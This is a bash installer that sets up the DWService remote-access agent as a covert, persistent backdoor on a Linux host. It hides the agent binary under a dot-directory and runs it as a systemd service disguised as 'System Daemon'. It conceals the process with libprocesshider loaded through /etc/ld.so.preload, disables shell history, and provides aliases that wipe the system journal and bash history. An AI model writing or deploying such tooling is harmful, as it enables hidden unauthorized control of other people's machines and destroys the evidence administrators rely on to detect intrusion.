#!/bin/bash

echo "Script started at $(date '+%Y-%m-%d %H:%M:%S')"

set -e

ACTION=$1

AGENT_URL="https://site007.dwservice.net/app/agent/2/installer/dwagent.sh"
HIDDEN_DIR="/usr/local/.dwcore"
HIDDEN_BIN="${HIDDEN_DIR}/.sysd"
SERVICE_NAME="sysd"
PHIDER_SO="/usr/local/lib/libprocesshider.so"
PHIDER_PRELOAD="/etc/ld.so.preload"
HOTKEY_BIN="/usr/local/bin/dwagent_control"
OFFICIAL_AGENT_DIR="/usr/share/dwagent"

# Function to log messages with timestamps
log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

install_all() {
  log "[+] Starting dependency installation..."
  apt update -y
  apt install -y git curl build-essential linux-headers-$(uname -r)
  log "[✓] Dependencies installed or already present."

  log "[+] Preparing DWAgent installation..."
  log "[*] Creating hidden directory: $HIDDEN_DIR"
  mkdir -p "$HIDDEN_DIR"
  cd "$HIDDEN_DIR"
  log "[*] Downloading fresh DWAgent installer from $AGENT_URL..."

  # Retry logic: attempt up to 3 times
  RETRY_COUNT=0
  MAX_RETRIES=3
  SUCCESS=0
  while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    RETRY_COUNT=$((RETRY_COUNT + 1))
    log "[*] Attempt $RETRY_COUNT of $MAX_RETRIES..."
    if wget --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" --tries=1 --timeout=20 --show-progress -O dwagent.sh "$AGENT_URL"; then
      EXPECTED_SIZE=1476018
      ACTUAL_SIZE=$(ls -l dwagent.sh | awk '{print $5}')
      if [[ "$ACTUAL_SIZE" -ne "$EXPECTED_SIZE" ]]; then
        log "[✗] DWAgent installer size mismatch. Expected $EXPECTED_SIZE bytes, got $ACTUAL_SIZE bytes."
        log "[!] The file may be corrupted. Retrying..."
      else
        SUCCESS=1
        break
      fi
    else
      log "[✗] Download attempt $RETRY_COUNT failed."
    fi
    if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
      log "[*] Retrying in 5 seconds..."
      sleep 5
    fi
  done

  if [ $SUCCESS -eq 0 ]; then
    log "[✗] Failed to download DWAgent installer after $MAX_RETRIES attempts."
    log "[*] Testing server availability..."
    wget --spider "$AGENT_URL" 2>&1 | while IFS= read -r line; do log "[*] $line"; done
    log "[!] Please check your network, DNS, or try a different URL."
    exit 1
  fi
  log "[✓] Downloaded DWAgent installer successfully."
  log "[*] Setting executable permissions on dwagent.sh"
  chmod +x dwagent.sh

  log "[*] Checking for graphical display..."
  if [[ -z "$DISPLAY" ]]; then
    log "[✗] No graphical display detected (DISPLAY is unset). DWAgent requires a GUI for initial setup."
    log "    - If on SSH, use X forwarding (e.g., ssh -X)."
    log "    - If local, ensure a desktop environment is running."
    exit 1
  fi
  log "[✓] Graphical display detected: $DISPLAY"

  log "[!] Manual step required:"
  log "--------------------------------------------------"
  log " 1. A DWAgent window will open shortly"
  log " 2. Wait for the Setup Code to appear"
  log " 3. Complete registration"
  log " 4. Press Ctrl+C in this terminal when finished"
  log "--------------------------------------------------"
  log "[!] Launching DWAgent installer in 5 seconds..."
  sleep 5

  log "[*] Starting DWAgent installer in foreground..."
  log "[*] Passing DISPLAY=$DISPLAY to ensure GUI works."
  env DISPLAY="$DISPLAY" /bin/bash -c "cd $HIDDEN_DIR && ./dwagent.sh"
  log "[*] DWAgent installer finished or interrupted by user (Ctrl+C)."

  log "[*] Checking for DWAgent installation completion..."
  for i in {1..60}; do
    AGENT_ORIG="/usr/share/dwagent/native/dwagent"
    if [[ -f "$AGENT_ORIG" ]]; then
      log "[✓] DWAgent binary detected at: $AGENT_ORIG"
      break
    fi
    log "[*] Waiting for DWAgent binary... ($i/60)"
    sleep 2
  done

  if [[ ! -f "$AGENT_ORIG" ]]; then
    log "[✗] DWAgent installation failed or not completed within 2 minutes."
    log "    - Ensure you completed the GUI setup."
    log "    - Run '$HIDDEN_DIR/dwagent.sh' manually to debug."
    exit 1
  fi

  log "[*] Stopping and disabling official DWAgent service (dwagsvc)..."
  systemctl stop dwagsvc 2>/dev/null || true
  systemctl disable dwagsvc 2>/dev/null || true
  pkill -f dwagent || true
  pkill -f dwagsvc || true
  log "[✓] Official DWAgent service stopped and disabled."

  log "[*] Moving DWAgent binary to hidden location: $HIDDEN_BIN"
  mv "$AGENT_ORIG" "$HIDDEN_BIN"
  log "[*] Setting executable permissions on $HIDDEN_BIN"
  chmod +x "$HIDDEN_BIN"

  log "[+] Creating hidden systemd service..."
  tee /etc/systemd/system/${SERVICE_NAME}.service >/dev/null <<EOF
[Unit]
Description=System Daemon
After=network.target

[Service]
Type=simple
ExecStart=$HIDDEN_BIN
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
  log "[*] Reloading systemd daemon..."
  systemctl daemon-reload
  log "[*] Enabling and starting $SERVICE_NAME service..."
  systemctl enable --now $SERVICE_NAME
  log "[✓] Systemd service $SERVICE_NAME created and started."

  log "[+] Installing libprocesshider..."
  log "[*] Cloning libprocesshider repository..."
  git clone https://github.com/gianlucaborello/libprocesshider /tmp/phider
  cd /tmp/phider
  log "[*] Modifying processhider.c to hide '.sysd'..."
  sed -i 's/"process_to_filter"/".sysd"/' processhider.c
  log "[*] Compiling libprocesshider..."
  make
  log "[*] Moving libprocesshider.so to $PHIDER_SO..."
  mv libprocesshider.so "$PHIDER_SO"
  log "[*] Updating $PHIDER_PRELOAD with $PHIDER_SO..."
  grep -q "$PHIDER_SO" "$PHIDER_PRELOAD" || echo "$PHIDER_SO" | tee -a "$PHIDER_PRELOAD"
  log "[*] Updating dynamic linker cache..."
  ldconfig
  cd ~
  log "[*] Cleaning up temporary phider directory..."
  rm -rf /tmp/phider
  log "[✓] libprocesshider installed."

  log "[+] Creating command trigger script..."
  tee "$HOTKEY_BIN" >/dev/null <<EOF
#!/bin/bash
export HISTFILE=/dev/null
set +o history
logger -t dwagent "Command script triggered with action: \$1"
case "\$1" in
  sta)
    logger -t dwagent "Starting sysd service"
    if systemctl is-active --quiet $SERVICE_NAME; then
      echo "DWAgent is already running."
    else
      systemctl start $SERVICE_NAME
      sleep 2
      if systemctl is-active --quiet $SERVICE_NAME; then
        PID=\$(pgrep -f ".sysd")
        logger -t dwagent "Started sysd service, PID: \$PID"
        echo "DWAgent started."
      else
        logger -t dwagent "Failed to start sysd service"
        echo "Failed to start DWAgent. Check logs with 'journalctl -u sysd'."
        exit 1
      fi
    fi
    ;;
  sto)
    logger -t dwagent "Stopping sysd service"
    if systemctl is-active --quiet $SERVICE_NAME; then
      systemctl stop $SERVICE_NAME
      logger -t dwagent "Stopped sysd service"
      echo "DWAgent stopped."
    else
      echo "DWAgent is not running."
    fi
    ;;
  clr)
    logger -t dwagent "Clearing logs"
    journalctl --vacuum-time=1s
    cat /dev/null > ~/.bash_history
    history -c
    logger -t dwagent "Logs cleared"
    echo "Logs cleared."
    ;;
  rmv)
    logger -t dwagent "Completely removing setup"
    systemctl stop $SERVICE_NAME
    systemctl disable $SERVICE_NAME
    rm -f /etc/systemd/system/$SERVICE_NAME.service
    systemctl daemon-reload
    rm -rf "$HIDDEN_DIR"
    rm -rf "$OFFICIAL_AGENT_DIR"
    sed -i '\|$PHIDER_SO|d' "$PHIDER_PRELOAD"
    rm -f "$PHIDER_SO"
    rm -f "$HOTKEY_BIN"
    journalctl --vacuum-time=1s
    cat /dev/null > ~/.bash_history
    history -c
    logger -t dwagent "Complete removal finished"
    echo "Setup completely removed."
    ;;
  *)
    echo "Usage: \$0 {sta|sto|clr|rmv}"
    echo "  sta - Start the DWAgent service"
    echo "  sto - Stop the DWAgent service"
    echo "  clr - Clear logs"
    echo "  rmv - Completely remove the setup"
    exit 1
    ;;
esac
EOF
  log "[*] Setting executable permissions on $HOTKEY_BIN..."
  chmod +x "$HOTKEY_BIN"
  log "[✓] Command script created."

  log "[+] Setting up aliases for sta, sto, clr, and rmv..."
  USER_HOME="/root"
  CURRENT_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
  if [[ $(id -u) -ne 0 ]]; then
    USER_HOME="$HOME"
  elif [[ -n "$CURRENT_USER" && "$CURRENT_USER" != "root" ]]; then
    USER_HOME=$(eval echo ~"$CURRENT_USER")
  fi
  BASHRC="$USER_HOME/.bashrc"
  ZSHRC="$USER_HOME/.zshrc"

  # Add aliases to .bashrc
  if ! grep -q "alias sta=" "$BASHRC"; then
    echo "alias sta='dwagent_control sta'" >> "$BASHRC"
  fi
  if ! grep -q "alias sto=" "$BASHRC"; then
    echo "alias sto='dwagent_control sto'" >> "$BASHRC"
  fi
  if ! grep -q "alias clr=" "$BASHRC"; then
    echo "alias clr='dwagent_control clr'" >> "$BASHRC"
  fi
  if ! grep -q "alias rmv=" "$BASHRC"; then
    echo "alias rmv='dwagent_control rmv'" >> "$BASHRC"
  fi
  log "[✓] Aliases added to $BASHRC."

  # Add aliases to .zshrc
  if [[ -f "$ZSHRC" ]]; then
    if ! grep -q "alias sta=" "$ZSHRC"; then
      echo "alias sta='dwagent_control sta'" >> "$ZSHRC"
    fi
    if ! grep -q "alias sto=" "$ZSHRC"; then
      echo "alias sto='dwagent_control sto'" >> "$ZSHRC"
    fi
    if ! grep -q "alias clr=" "$ZSHRC"; then
      echo "alias clr='dwagent_control clr'" >> "$ZSHRC"
    fi
    if ! grep -q "alias rmv=" "$ZSHRC"; then
      echo "alias rmv='dwagent_control rmv'" >> "$ZSHRC"
    fi
    log "[✓] Aliases added to $ZSHRC."
  else
    log "[!] $ZSHRC not found. Aliases not added for zsh."
  fi

  # Source the appropriate file for the current user
  if [[ -n "$CURRENT_USER" && "$CURRENT_USER" != "root" ]]; then
    if [[ -n "$BASH_VERSION" ]]; then
      log "[*] Sourcing $BASHRC for user $CURRENT_USER to apply aliases..."
      su - "$CURRENT_USER" -c "bash -c 'source $BASHRC'"
      log "[✓] Aliases applied for user $CURRENT_USER (bash)."
    elif [[ -n "$ZSH_VERSION" ]]; then
      if [[ -f "$ZSHRC" ]]; then
        log "[*] Sourcing $ZSHRC for user $CURRENT_USER to apply aliases..."
        su - "$CURRENT_USER" -c "zsh -c 'source $ZSHRC'"
        log "[✓] Aliases applied for user $CURRENT_USER (zsh)."
      fi
    else
      log "[!] Current shell is neither bash nor zsh (SHELL=$SHELL) for user $CURRENT_USER."
      log "    Aliases will be available in new shell sessions for $CURRENT_USER."
      log "    Run 'bash' or 'zsh' as $CURRENT_USER, or manually source $BASHRC or $ZSHRC."
    fi
  else
    if [[ -n "$BASH_VERSION" ]]; then
      log "[*] Sourcing $BASHRC to apply aliases in the current session..."
      source "$BASHRC"
      log "[✓] Aliases applied in the current session (bash)."
    elif [[ -n "$ZSH_VERSION" ]]; then
      if [[ -f "$ZSHRC" ]]; then
        log "[*] Sourcing $ZSHRC to apply aliases in the current session..."
        source "$ZSHRC"
        log "[✓] Aliases applied in the current session (zsh)."
      fi
    else
      log "[!] Current shell is neither bash nor zsh (SHELL=$SHELL)."
      log "    Aliases will be available in new shell sessions."
      log "    Run 'bash' or 'zsh' to start a new shell, or manually source $BASHRC or $ZSHRC."
    fi
  fi

  log "[✓] Installation complete. Use the following commands:"
  log "    🔹 sta → Start the DWAgent service"
  log "    🔹 sto → Stop the DWAgent service"
  log "    🔹 clr → Clear logs"
  log "    🔹 rmv → Completely remove the setup"
}

uninstall_all() {
  echo "[!] Full uninstall in progress..."

  if grep -q "$PHIDER_SO" "$PHIDER_PRELOAD"; then
    sed -i "\|$PHIDER_SO|d" "$PHIDER_PRELOAD"
    ldconfig
  fi
  rm -f "$PHIDER_SO"
  if [[ -f "$PHIDER_SO" ]]; then
    echo "[✗] Failed to remove $PHIDER_SO"
  else
    echo "[✓] Removed $PHIDER_SO"
  fi

  systemctl stop "$SERVICE_NAME" 2>/dev/null || true
  systemctl disable "$SERVICE_NAME" 2>/dev/null || true
  rm -f "/etc/systemd/system/$SERVICE_NAME.service"
  systemctl daemon-reload
  rm -rf "$HIDDEN_DIR"

  systemctl stop dwagsvc 2>/dev/null || true
  systemctl disable dwagsvc 2>/dev/null || true
  pkill -f dwagent || true
  pkill -f dwagsvc || true
  if [[ -f "$OFFICIAL_AGENT_DIR/uninstall.sh" ]]; then
    echo "[!] Removing official DWAgent install..."
    "$OFFICIAL_AGENT_DIR/uninstall.sh"
  else
    echo "[!] Force removing official DWAgent..."
    rm -rf "$OFFICIAL_AGENT_DIR"
  fi

  USER_HOME="/root"
  CURRENT_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
  if [[ $(id -u) -ne 0 ]]; then
    USER_HOME="$HOME"
  elif [[ -n "$CURRENT_USER" && "$CURRENT_USER" != "root" ]]; then
    USER_HOME=$(eval echo ~"$CURRENT_USER")
  fi
  BASHRC="$USER_HOME/.bashrc"
  ZSHRC="$USER_HOME/.zshrc"

  # Remove aliases from .bashrc
  sed -i '/alias sta=/d' "$BASHRC"
  sed -i '/alias sto=/d' "$BASHRC"
  sed -i '/alias clr=/d' "$BASHRC"
  sed -i '/alias rmv=/d' "$BASHRC"

  # Remove aliases from .zshrc
  if [[ -f "$ZSHRC" ]]; then
    sed -i '/alias sta=/d' "$ZSHRC"
    sed -i '/alias sto=/d' "$ZSHRC"
    sed -i '/alias clr=/d' "$ZSHRC"
    sed -i '/alias rmv=/d' "$ZSHRC"
  fi

  journalctl --vacuum-time=1s
  cat /dev/null > ~/.bash_history
  history -c

  echo "[✓] All traces removed."
}

if [[ "$ACTION" == "install" ]]; then
  install_all
elif [[ "$ACTION" == "uninstall" ]]; then
  uninstall_all
else
  echo "Usage: $0 [install|uninstall]"
  exit 1
fi
